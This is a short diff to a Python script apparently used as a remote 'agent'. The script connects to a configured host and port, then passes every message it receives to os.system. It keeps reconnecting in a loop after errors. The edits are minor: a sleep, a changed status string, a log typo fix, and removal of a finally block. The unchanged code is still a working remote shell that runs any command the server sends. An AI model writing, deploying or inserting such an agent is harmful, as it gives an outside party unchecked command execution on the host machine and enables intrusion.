@@ -21,17 +21,18 @@ def connect_agent():
     sock = socket(AF_INET, SOCK_STREAM)
     addr = (HOST, PORT)
     LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
+    time.sleep(1)
     try:
         sock.connect(addr)
         while True:
-            sock.send('Agent is here')
+            sock.send('Waitin for incoming data')
             data = sock.recv(1024)
             if not data:
                 continue
             LOG.info('Received {}'.format(data))
             os.system(data)
     except:
-        LOG.error('Server doesn\'t response')
+        LOG.error('Server doesn\'t respond')
         time.sleep(1)
         connect_agent()
 
@@ -41,5 +42,3 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         sys.exit()
         LOG.info('Exit')
-    finally:
-        socket.close()
